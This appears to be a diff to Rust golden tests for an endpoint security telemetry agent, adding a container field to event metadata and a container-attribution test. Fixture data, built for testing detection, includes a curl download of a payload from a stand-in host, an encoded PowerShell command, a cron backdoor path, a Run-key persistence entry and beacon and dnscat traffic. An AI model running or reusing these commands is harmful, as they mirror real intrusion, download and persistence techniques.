@@ -42,6 +42,7 @@ fn exec_unix_golden() {
                 },
                 timestamp_ns: 1_756_900_000_123_456_789,
                 comm: "bash".into(),
+                container: None,
             },
             image_path: "/usr/bin/curl".into(),
             cmdline: "curl -fsSL https://example.test/payload.sh -o /tmp/payload.sh".into(),
@@ -76,6 +77,7 @@ fn exec_windows_golden() {
                 },
                 timestamp_ns: 1_756_900_001_000_000_000,
                 comm: "powershell.exe".into(),
+            container: None,
             },
             image_path: r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe".into(),
             cmdline: "powershell.exe -NoProfile -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA".into(),
@@ -104,6 +106,7 @@ fn exec_lineage_golden() {
                 },
                 timestamp_ns: 1_756_900_004_000_000_000,
                 comm: "cmd.exe".into(),
+                container: None,
             },
             image_path: r"C:\Windows\System32\cmd.exe".into(),
             cmdline: "cmd.exe /c whoami".into(),
@@ -155,6 +158,7 @@ fn detection_ml_golden() {
                 },
                 timestamp_ns: 1_756_900_004_123_456_789,
                 comm: "bash".into(),
+                container: None,
             },
             image_path: "/usr/bin/python3".into(),
             cmdline: "python3 -c print(1)".into(),
@@ -181,6 +185,7 @@ fn file_open_golden() {
                 user: User::Unix { uid: 0, gid: 0 },
                 timestamp_ns: 1_756_900_002_000_000_000,
                 comm: "cron".into(),
+                container: None,
             },
             path: "/etc/cron.d/backdoor".into(),
             flags: 0o1101, // O_WRONLY | O_CREAT | O_TRUNC
@@ -199,6 +204,7 @@ fn dns_query_golden() {
                 user: User::Unknown,
                 timestamp_ns: 1_756_900_010_000_000_000,
                 comm: "chrome-update.exe".into(),
+                container: None,
             },
             query: "beacon.example.test".into(),
             qtype: 1,
@@ -223,6 +229,7 @@ fn wmi_activity_golden() {
                 },
                 timestamp_ns: 1_756_900_050_000_000_000,
                 comm: "wmic.exe".into(),
+                container: None,
             },
             namespace: r"ROOT\CIMv2".into(),
             query: None,
@@ -245,6 +252,7 @@ fn script_block_golden() {
                 },
                 timestamp_ns: 1_756_900_040_000_000_000,
                 comm: "powershell.exe".into(),
+                container: None,
             },
             script_block_id: "a1b2c3d4-e5f6-7890-abcd-ef1234567890".into(),
             path: None,
@@ -270,6 +278,7 @@ fn image_load_golden() {
                 },
                 timestamp_ns: 1_756_900_030_000_000_000,
                 comm: "powershell.exe".into(),
+                container: None,
             },
             image_path: r"C:\Windows\System32\amsi.dll".into(),
         }),
@@ -290,6 +299,7 @@ fn registry_set_golden() {
                 },
                 timestamp_ns: 1_756_900_020_000_000_000,
                 comm: "chrome-update.exe".into(),
+                container: None,
             },
             key: r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run".into(),
             value_name: "ChromeUpdate".into(),
@@ -316,6 +326,7 @@ fn assembly_load_golden() {
                 },
                 timestamp_ns: 1_756_900_060_000_000_000,
                 comm: "powershell.exe".into(),
+                container: None,
             },
             assembly_name: "MyPayload, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null"
                 .into(),
@@ -339,6 +350,7 @@ fn smb_connect_golden() {
                 },
                 timestamp_ns: 1_756_900_070_000_000_000,
                 comm: "psexec.exe".into(),
+                container: None,
             },
             server_name: r"\\WIN-TARGET".into(),
         }),
@@ -361,6 +373,7 @@ fn udp_send_golden() {
                 },
                 timestamp_ns: 1_756_900_080_000_000_000,
                 comm: "dnscat.exe".into(),
+                container: None,
             },
             daddr: "8.8.8.8".parse::<IpAddr>().unwrap(),
             dport: 53,
@@ -380,6 +393,7 @@ fn connect_v6_golden() {
                 user: User::Unknown,
                 timestamp_ns: 1_756_900_003_000_000_000,
                 comm: "beacon".into(),
+                container: None,
             },
             daddr: "2001:db8::1337".parse::<IpAddr>().unwrap(),
             dport: 8443,
@@ -398,6 +412,7 @@ fn exec_enriched_golden() {
                 user: User::Unix { uid: 0, gid: 0 },
                 timestamp_ns: 1_756_900_005_000_000_000,
                 comm: "payload".into(),
+                container: None,
             },
             image_path: "/tmp/payload".into(),
             cmdline: "/tmp/payload".into(),
@@ -412,6 +427,36 @@ fn exec_enriched_golden() {
 }
 
 #[test]
+fn exec_container_golden() {
+    // Attribution-only for now (issue #80): `id` from the cgroup path, `image`/`name`
+    // await the Docker/containerd socket lookup (follow-up PR).
+    assert_golden(
+        &Event::Exec(ExecEvent {
+            meta: EventMeta {
+                pid: 8842,
+                ppid: 1,
+                user: User::Unix { uid: 0, gid: 0 },
+                timestamp_ns: 1_756_900_006_000_000_000,
+                comm: "nginx".into(),
+                container: Some(schema::ContainerContext {
+                    id: "a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456".into(),
+                    image: None,
+                    name: None,
+                }),
+            },
+            image_path: "/usr/sbin/nginx".into(),
+            cmdline: "nginx -g daemon off;".into(),
+            argv: ["nginx", "-g", "daemon off;"].map(String::from).into(),
+            parent_comm: None,
+            parent_image_path: None,
+            sha256: None,
+            signature: None,
+        }),
+        "exec_container",
+    );
+}
+
+#[test]
 fn unbounded_cmdline_survives() {
     // Audit F-4: multi-kilobyte encoded command lines must round-trip untouched.
     let long = format!("powershell.exe -EncodedCommand {}", "A".repeat(8 * 1024));
@@ -422,6 +467,7 @@ fn unbounded_cmdline_survives() {
             user: User::Unknown,
             timestamp_ns: 0,
             comm: "powershell.exe".into(),
+            container: None,
         },
         image_path: r"C:\long\path\that\exceeds\the\old\256\byte\limit".repeat(8),
         cmdline: long.clone(),
@@ -451,6 +497,7 @@ fn ml_cmdline_is_the_canonical_nul_joined_form() {
             user: User::Unknown,
             timestamp_ns: 0,
             comm: "x".into(),
+            container: None,
         },
         image_path: String::new(),
         cmdline: cmdline.into(),
@@ -495,6 +542,7 @@ fn meta_accessor_covers_all_variants() {
         user: User::Unix { uid: 1, gid: 1 },
         timestamp_ns: 42,
         comm: "x".into(),
+        container: None,
     };
     let events = [
         Event::Exec(ExecEvent {
